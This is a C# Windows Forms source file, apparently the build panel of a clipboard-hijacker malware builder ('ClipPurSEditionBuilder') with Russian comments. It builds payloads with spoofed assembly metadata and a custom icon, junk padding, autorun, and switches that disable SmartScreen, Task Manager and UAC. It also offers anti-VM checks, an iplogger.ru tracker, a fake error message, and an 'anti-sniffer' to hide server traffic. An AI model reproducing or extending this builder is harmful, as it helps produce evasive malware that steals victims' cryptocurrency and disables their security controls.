namespace ClipPurSEditionBuilder.ControlsSE
{
    using System;
    using System.IO;
    using System.Threading;
    using System.Threading.Tasks;
    using System.Windows.Forms;
    using License;
    using Sticks;

    public partial class BuildSE : UserControl
    {
        public BuildSE() => InitializeComponent();

        private void TextBoxOnTextChanged(object sender, KeyPressEventArgs e)
        {
            char number = e.KeyChar;
            if (!char.IsDigit(number) && number != 8 && number != 0x2E) e.Handled = true;
        }

        /// <summary>
        /// Генерация Assembly свойства для билд файла
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void GenAss_Click(object sender, EventArgs e)
        {
            NativeMethods.SetFocus(IntPtr.Zero);
            this.AssProductTextBox.Text = GenX.GetUpdate();
            this.AssTitleTextBox.Text = GenX.GenerateIdentifier(15);
            this.AssDescriptTextBox.Text = GenX.GenerateIdentifier(15);
            this.AssCompanyTextBox.Text = GenX.GetUpdate();
            this.AssCopyrightTextBox.Text = GenX.GenerateIdentifier(15);
            this.AssVerTextBox.Text = Convert.ToString($"{GenX.Next(10)}.{GenX.Next(10)}.{GenX.Next(10)}.{GenX.Next(10)}");
            this.AssFileVerTextBox.Text = Convert.ToString($"{GenX.Next(10)}.{GenX.Next(10)}.{GenX.Next(10)}.{GenX.Next(10)}");
            this.AssGuidTextBox.Text = Guid.NewGuid().ToString();
        }

        /// <summary>
        /// Выбор иконки для билд файла
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void SelectIcon_Click(object sender, EventArgs e)
        {
            string result = string.Empty;
            using var Open = new OpenFileDialog
            {
                Title = Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase)
              ? Language.GlobalMessageStrings_en_US.IconChoice
              : Language.GlobalMessageStrings_ru_RU.IconChoice,
                Filter = "Icon (*.ico)|*.ico",
                Multiselect = false,
                AutoUpgradeEnabled = true,
                CheckFileExists = true,
                RestoreDirectory = true
            };

            if (Open.ShowDialog() == DialogResult.OK)
            {
                this.IcoPath.Text = Open.FileName;
                if (File.Exists(this.IcoPath.Text))
                {
                    this.IcoViewer.ImageLocation = this.IcoPath.Text;
                    try
                    {
                        this.SizeIcon.Text = Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase)
                      ? $"{Language.GlobalMessageStrings_en_US.SizeIcon}  {GetFileSize.Inizialize(new FileInfo(this.IcoPath.Text).Length)}"
                      : $"{Language.GlobalMessageStrings_en_US.SizeIcon}  {GetFileSize.Inizialize(new FileInfo(this.IcoPath.Text).Length)}";
                    }
                    catch { this.SizeIcon.Text = result; }
                }
            }
            else
            {
                if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                {
                    ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.NoIconChoice);
                }
                else
                {
                    ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.NoIconChoice);
                }
                this.IcoPath.Clear();
                this.SizeIcon.Text = result;
                this.IcoViewer.Image = null;
            }
        }
        /// <summary>
        /// Подписываемся на событие кнопки KeyPress при открытие контрола
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void BuildSE_Load(object sender, EventArgs e)
        {
            //  this.ExtensionText.Focus();
            this.AssVerTextBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.AssFileVerTextBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
        }

        /// <summary>
        /// Проверка на открытие/закрытие чекбокс контроллов и изменения их значений
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void AdminCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            if (this.AdminCheckBox.Checked)
            {
                this.SmartOffCheckBox.Enabled = true;
                this.TaskMgrOffCheckBox.Enabled = true;
                this.UacOffCheckBox.Enabled = true;
                this.ShowNewAutoRunLabel.Visible = true;
            }
            else
            {
                this.SmartOffCheckBox.Checked = false;
                this.SmartOffCheckBox.Enabled = false;
                this.TaskMgrOffCheckBox.Checked = false;
                this.TaskMgrOffCheckBox.Enabled = false;
                this.UacOffCheckBox.Checked = false;
                this.UacOffCheckBox.Enabled = false;
                this.ShowNewAutoRunLabel.Visible = false;
            }
        }

        /// <summary>
        /// Запуск процесс компиляции исходного файла с проверками по ключу.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void Generation_ClickAsync(object sender, EventArgs e)
        {
            NativeMethods.SetFocus(IntPtr.Zero);

            #region BuildSettings

            var build = new Build
            (
                this.IcoPath.Text,
                this.NameOutput.Text,
                this.AssTitleTextBox.Text,
                this.AssDescriptTextBox.Text,
                this.AssCompanyTextBox.Text,
                this.AssProductTextBox.Text,
                this.AssCopyrightTextBox.Text,
                this.AssVerTextBox.Text,
                this.AssFileVerTextBox.Text,
                this.AssGuidTextBox.Text,
                this.IPBox.Text,
                this.ErrorBox.Text,
                this.ShowMessage,
                this.DelayCheckBox,
                this.GarbageCheckBox,
                this.AutoRunCheckBox,
                this.SmartOffCheckBox,
                this.TaskMgrOffCheckBox,
                this.UacOffCheckBox,
                this.AntiVMCheckBox,
                this.IPLOGCheckBox,
                this.FakeCheckBox
            );

            #endregion

            if (string.IsNullOrWhiteSpace(this.NameOutput.Text) || string.IsNullOrWhiteSpace(this.AssTitleTextBox.Text) || string.IsNullOrWhiteSpace(this.AssDescriptTextBox.Text) || string.IsNullOrWhiteSpace(this.AssCompanyTextBox.Text) || string.IsNullOrWhiteSpace(this.AssCopyrightTextBox.Text) || string.IsNullOrWhiteSpace(this.AssFileVerTextBox.Text))
            {
                if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                {
                    ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.FillFields);
                }
                else
                {
                    ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.FillFields);
                }
            }
            else
            {
                Task.Run(() => AntiSniffer.Inizialize()).Start(); // Антисниффер ( чтобы не отслеживали запрос до сервера )

                //if (CheckerKeys.CompareKey()) // Проверка ключа тут.
                //{
                  //  CheckerKeys.GetLicenseInfo();

                        if (SourceEdition.values.Count != 0)
                        {
                            bool result = await Task.Run(() => SourceEdition.Inizialize(SourceEdition.values, build)); 
                            // Если хотите можете добавить обфускацию для билд файла т.к идёт ожидание
                        }
                        else
                        {
                            if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                            {
                                ControlActive.CheckMessage(build.BoxStatus, Language.GlobalMessageStrings_en_US.BasePurse);
                            }
                            else
                            {
                                ControlActive.CheckMessage(build.BoxStatus, Language.GlobalMessageStrings_ru_RU.BasePurse);
                            }
                        }
                //}
                //else
                //{
                //    MusicPlay.Inizialize(Resources.Error_Build);
                //    if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                //    {
                //        ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.ErrorLicense);
                //        FileControl.CreateFile("Clip_Key.txt", $"Your key to access the program: {HardwareID.GET_ID}\r\nSend this key to the developer for activation.\r\n");
                //    }
                //    else
                //    {
                //        ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.ErrorLicense);
                //        FileControl.CreateFile("Clip_Key.txt", $"Ваш ключ для доступа к программе: {HardwareID.GET_ID}\r\nЭтот ключ скиньте разработчику для активации.\r\n");
                //    }
                //    Thread.Sleep(2000);
                //    Application.Exit();
                //}
            }
        }

        private void HelperIPLogger_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            try
            {
                System.Diagnostics.Process.Start("https://iplogger.ru/");
                NativeMethods.SetFocus(IntPtr.Zero);
            }
            catch { }
        }

        private void IPLOGCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            if (this.IPLOGCheckBox.Checked)
            {
                this.IPLoGGeR.Visible = true;
                this.HelperIPLogger.Visible = true;
                this.IPBox.Visible = true;
            }
            else
            {
                this.IPLoGGeR.Visible = false;
                this.HelperIPLogger.Visible = false;
                this.IPBox.Visible = false;
            }
        }

        private void FakeCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            if (this.FakeCheckBox.Checked)
            {
                this.ErrorText.Visible = true;
                this.ErrorBox.Visible = true;
            }
            else
            {
                this.ErrorText.Visible = false;
                this.ErrorBox.Visible = false;
            }
        }
    }
}